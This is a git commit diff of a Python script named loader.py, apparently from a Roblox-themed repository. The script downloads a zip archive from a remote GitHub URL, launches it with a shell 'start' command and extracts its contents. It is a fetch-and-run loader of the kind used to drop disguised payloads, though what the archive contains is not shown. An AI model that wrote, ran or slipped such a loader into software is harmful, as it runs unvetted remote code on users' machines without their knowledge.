715bcee019a0adc385114edee93b51e39a6de27a
bj0rntje <128162649+bj0rntje@users.noreply.github.com>
2023-07-07 17:47:43 +0200

    Update loader.py

--- loader.py
+++ loader.py
@@ -3,27 +3,18 @@ import os
 import subprocess
 import time
 # Define the remote file to retrieve
-remote_url = '/bj0rntje/roblox/archive/refs/heads/main.zip'
+remote_url = 'https://github.com/bj0rntje/roblox/raw/main/unpackaged.zip'
 # Define the local filename to save data
 local_file = 'packaged.zip'
 # Download remote and save locally
 request.urlretrieve(remote_url, local_file)
 f = open("packaged.zip", "r")
 commanding = "start "+local_file
-time.sleep(1)
 os.system(commanding)
 #subprocess.call(commanding)
 
 
 
-# importing the zipfile module
-from zipfile import ZipFile
-  
-# loading the temp.zip and creating a zip object
-with ZipFile("packaged.zip", 'r') as zObject:
-  
-    # Extracting all the members of the zip 
-    # into a specific location.
-    zObject.extractall(
-        path="%userprofile%\Downloads\files_in_usage\unpackaged")
-hello = input("works!")
+import zipfile
+with zipfile.ZipFile("packaged.zip","r") as zip_ref:
+    zip_ref.extractall("targetdir")
